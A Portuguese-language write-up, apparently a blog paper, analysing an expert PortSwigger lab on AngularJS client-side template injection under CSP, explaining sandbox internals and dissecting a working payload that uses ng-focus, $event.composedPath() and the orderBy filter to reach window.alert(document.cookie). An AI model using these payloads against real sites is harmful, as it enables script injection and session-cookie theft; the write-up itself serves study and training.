---
title: "XSS: Explorando cenários complexos: parte 2 | AngularJS"
categories:
  - papers
  - web hacking
  - owasp
tags:
  - papers
  - ctf
  - owasp
  - XSS
---

## XSS: Cenários Complexos - parte 2 | AngularJS

Vamos para mais uma análise de cenário? Meu intuito aqui não é te ensinar a resolver um lab ou algo do tipo, mas apenas estudarmos e analisarmos mais um lab de nível expert na PortSwigger. Esse também se trata de um com AngularJS, nos trazendo apenas algumas diferenças do anterior.

Inclusive, caso ainda não tenha lido meu artigo anterior, recomendo! Visto que usaremos conceitos que já foram abordados lá, e para evitar repetição desnecessária, resolvi não trazê-los de novo. Aqui está o [link](https://github.com/bielzaoo/papers/blob/main/WebHacking/XSS/xss_cenarios_complexos-parte-2.md).

### A Falha Raiz: Client-Side Template Injection

Esse caso aqui é parecido com o anterior: a input do usuário é refletida dentro do contexto do Angular (via `?search=`), e isso se dá através de algum elemento que tenha a propriedade `ng-app` ou similar.

Por exemplo:

```html
<body ng-app="" ng-csp="" class="ng-scope"></body>
```

Acontece que quando o Angular faz um "scan" pelo DOM e acha algo entre `{{ expressao }}` ele lê como uma expressão e executa. A partir desse momento, não estaríamos mais lidando com o parser HTML do browser, mas sim com o *evaluator* do Angular, o que muda o jogo.

O nome desse cenário é *Client-Side Template Injection*, ou carinhosamente chamado de CSTI. Onde, diferente do SSTI, o código é executado em client-side e não no contexto do servidor.

### A Restrição do Comprimento + bloqueio do `$eval`

Para você que não sabe, o Angular possui um mecanismo de **Sandbox** e no meu artigo anterior eu expliquei como funciona, sugiro dar uma olhada, aqui está o [link](https://github.com/bielzaoo/papers/blob/main/WebHacking/XSS/xss_cenarios_complexos.md).

Bem, voltando... Parece que `$eval` está bloqueado e isso impede o caminho padrão para execução de código. A solução é fazer como fizemos no cenário anterior (mais uma vez, sugiro ler o artigo anterior para entender como o filtro funciona) e usar o filtro `orderBy` para nos dar a execução de código.

### O CSP

Creio que a essa altura você já saiba o que é o CSP, certo? Caso não, o bom e velho Google consegue te ajudar. Mas, basicamente, trata-se de um mecanismo usado para impedir que executemos código JavaScript de origens não permitidas. E no nosso cenário aqui, ele está presente para que, ainda que alguém conseguisse dar bypass no sandbox, não conseguiria executar JavaScript inline ou vindo de origens não permitidas — seria um "plus" para o sandbox. Como assim?

Veja, em cenários "normais", isto é, com CSTI e sandbox confirmado, o seguinte código poderia ser usado para dar bypass no sandbox:

```javascript
{{constructor.constructor('alert(1)')()}}
```

Esse payload seria passado para a input vulnerável e seria interpretado pelo Angular e então executado, ou seja, com JavaScript inline. Porém, com CSP ativo, JavaScript inline é bloqueado, então não conseguiríamos executar o payload diretamente assim.

Para clarear suas ideias, vamos dizer que `alert()` fosse permitido e conseguíssemos executar. Internamente, o Angular faria algo assim:

Caso legítimo, comportamento padrão:

```javascript
// Eu escrevi no HTML:
// {{ user.name.toUpperCase() }}

// O Angular faz aproximadamente isso:
var expressao = 'user.name.toUpperCase()';

var fn = new Function('scope', 'return ' + expressao);
// equivalente a criar:
// function(scope) { return user.name.toUpperCase() }

// Depois executa passando o scope atual:
fn(scope); // retorna o valor para colocar no DOM
```

Agora, com `alert()`:

```javascript
// Eu passei:
// {{ alert() }}

// O Angular faz aproximadamente isso:
var expressao = 'alert()';

var fn = new Function('scope', 'return ' + expressao);
// equivalente a criar:
// function(scope) { return alert() }

// Depois executa passando o scope atual:
fn(scope); 
```

O `new Function` é essencialmente um `eval` — ou seja, ela pega a string que você passou e torna ela em algo executável.

Então, se usássemos o payload de bypass em cenários convencionais, seria assim:

```plaintext
{{constructor.constructor('alert(1)')()}}

constructor        → pega o constructor da string (que é String)
.constructor       → pega o constructor de String (que é Function)
('alert(1)')       → cria uma nova função com esse código
() 
```

Ou seja, estamos chegando em `Function` diretamente, para que "ele" torne nosso código executável.

Isso, sem CSP, seria um caso tradicional de como funcionaria um bypass no sandbox. Agora, com o CSP, o Angular muda a forma como compila o código.

O CSP bloqueia chamadas a `new Function()` e `eval()`, portanto, o Angular precisa mudar a forma como compila as expressões. O processo fica mais "manual" do lado do Angular — internamente, ele para de compilar e passa a **interpretar** a expressão, parte por parte. Ele vai lendo progressivamente e processando, dessa forma aqui:

```javascript
// Expressão: user.name.toUpperCase()

// Sem CSP: new Function('return user.name.toUpperCase()')
// Com CSP: o Angular faz o trabalho manualmente:

var obj = scope['user'];        // resolve 'user' no scope
obj = obj['name'];              // acessa propriedade 'name'
obj = obj['toUpperCase'];       // acessa o método
return obj.call(context);       // chama
```

Usando o `alert()` como exemplo:

```javascript
// Expressão: alert(1)

var fn = scope['alert'];        // procura 'alert' no scope Angular
                                // não acha — alert não é uma variável do scope

// O interpreter então sobe para o contexto global
var fn = window['alert'];       // acha! alert existe em window
fn.call(context, 1);            // chama alert(1)
```

Bem, conseguimos ter um panorama geral do que acontece por baixo dos panos.

Certo, mas tem um fator a se considerar aqui: o CSP não bloqueia eventos nativos que o próprio Angular define. Acontece que o Angular expõe uma variável chamada `$event` dentro de handlers de evento e essa variável referencia o objeto real de evento do browser.

### Exploit Chain: Dissecando o Payload

Vamos olhar o payload fornecido pela PortSwigger:

```plaintext
?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

O `<input id=x ng-focus=>` passa uma tag HTML com um event handler do Angular, que é o `ng-focus`. Poderíamos ter usado `onclick`, certo? Mas o CSP bloqueia `onclick` inline. Porém, lembra que dissemos que o CSP não bloqueia eventos nativos definidos pelo Angular?

O `#x` é chamado de *fragment identifier* — basicamente ele instrui o browser a focar em um elemento que tenha o `id=x`, disparando o evento de foco sem precisar que a vítima faça isso.

Sobre a parte `$event.composedPath()`: `$event` basicamente é um objeto de evento real. Já `composedPath()` retorna um array com todos os elementos no path do evento, do mais específico até chegar no `window`, sendo este o último item. Como assim?

Para te ajudar a visualizar melhor: quando ocorre um evento no browser, ocorre algo chamado propagação de eventos, que significa que esse evento não ocorreu apenas no elemento em questão, mas percorre toda a Árvore do DOM. Por exemplo, vamos considerar o evento de click em uma tag HTML, a `<input>`, considerando o seguinte código HTML:

```html
<html>
  <body>
    <div>
      <input id="x">
    </div>
  </body>
</html>
```

Para chegar no `<input>` e dizer que o evento de click foi nele, toda a Árvore do DOM foi percorrida, começando em `window` e passando por `html`, `body` e por aí vai. Em termos brutos, é como se clicássemos em `<input>` e todos os elementos anteriores que são parentes dele também sentissem o click.

E acontece que `.composedPath()` retorna todos esses elementos que fazem parte desse caminho, ou **path**, até chegar no `<input>` — e você já vai entender o porquê disso tudo. O retorno pode ser algo como:

```javascript
[
  input#x,        // o elemento que recebeu o evento
  div,
  body,
  html,
  document,
  window          // ← sempre o último
]
```

Agora, temos a parte: `|orderBy:'(z=alert)(document.cookie)'` e aqui mora o core do payload. Se você já leu o artigo anterior já conhece a sintaxe do `orderBy` e a sintaxe de filtro do Angular. Vamos entender o que está acontecendo.

Antes, preciso te lembrar de um comportamento do próprio JavaScript, chamado de *escopo global implícito*. Em termos simples, quando você usa um método como `alert()`, a engine do JavaScript faz uma busca do contexto desse método — a qual elemento ele faz parte. Portanto, se você escreve assim no código:

```javascript
alert();
```

A engine vai buscar em torno do seu código, ou seja, no *escopo local*, se existe algum método com esse nome para então executá-lo. Se não há, a engine continua buscando na *cadeia de escopos* até achar esse método — e no nosso exemplo ela acharia em `window`, visto que existe `window.alert()`. Pronto, guarde essa informação com você.

Agora, vamos olhar para: `$event.composedPath()|orderBy:'(z=alert)(document.cookie)'`:

```javascript
// Sabemos que irá retornar um array com todos os elementos, desde <input> até window
$event.composedPath();

// O orderBy vai iterar sobre esse array e vai usar cada elemento desse array para avaliar a expressão:
|orderBy: '(z=alert)(document.cookie)';

// Como assim?
// Vou te mostrar! 

// É como se fizéssemos assim:
// Primeiro elemento do array retornado por composedPath(): input
// Portanto, estamos no *contexto*, ou seja, no *escopo* do elemento input.
// Isso quer dizer que ao fazer (z=alert) a engine vai buscar o método alert()
// no escopo do elemento input, ou seja input.alert, mas sabemos que não existe.
// ou seja (z=alert) é igual a z = input.alert
z = input.alert  // não existe alert() dentro do elemento input do DOM, portanto, será retornado undefined.

// Agora, será avaliada a segunda parte: (document.cookie)
// Basicamente, é como se estivéssemos fazendo:

z(document.cookie);  // Porém, z = undefined porque não existe alert dentro de input.

// O que resulta em:
undefined(document.cookie);

// Certo, já que input não tem, vamos continuar a iteração, ou seja, passar para outro elemento. Vamos supor que o próximo elemento fosse uma div.
// Então:
z = div.alert  // não existe alert() dentro do elemento div do DOM, portanto, será retornado undefined.

// Agora, será avaliada a segunda parte: (document.cookie)
// Basicamente, é como se estivéssemos fazendo:

z(document.cookie);  // Porém, z = undefined porque não existe alert dentro de div.

// O que resulta em:
undefined(document.cookie);
```

Essa iteração vai ocorrendo até o `alert()` ser encontrado em algum lugar. Claro, a expressão `undefined(document.cookie)` gera um erro implícito, porém, não trava a iteração — que vai acontecer até achar o `alert`. E então, como sabemos, o último elemento desse array será `window` e sabemos que existe `alert()` dentro de `window`, ou seja, teríamos o seguinte código:

```javascript
// (z=alert) vai ser avaliado em:
z = window.alert  // Existe!

// Agora, será avaliada a segunda parte: (document.cookie)
// Basicamente, é como se estivéssemos fazendo:

z(document.cookie);  // Ou seja, window.alert(document.cookie)

// Ou seja:
window.alert(document.cookie);
```

E assim, é possível conseguir executar código via CSTI.

## No fim

De fato, o processo é mais divertido do que ver a vulnerabilidade em si. E vemos que tentar defender JavaScript usando o próprio JavaScript talvez não seja lá a melhor das opções. O interessante também é que não precisamos de ferramentas complexas para fazer essa análise, apenas um pouco de pesquisa e treino com a melhor ferramenta que existe: o seu cérebro.

Esse tipo de falha, esse tipo de análise — nem mesmo as melhores ferramentas de scan de vulnerabilidades conseguiriam chegar lá. Talvez, num futuro próximo sim, mas duvido um pouco. O segredo é não se deixar ser pego pela preguiça e terceirizar o nosso raciocínio para IAs. Elas podem até fazer o trabalho sujo: te ajudar a entender sintaxe, código, lógica, enfim. Mas essas nuances, esses insights, devem partir de nós.

Te vejo na nossa próxima análise!
Muito obrigado!
Até breve!
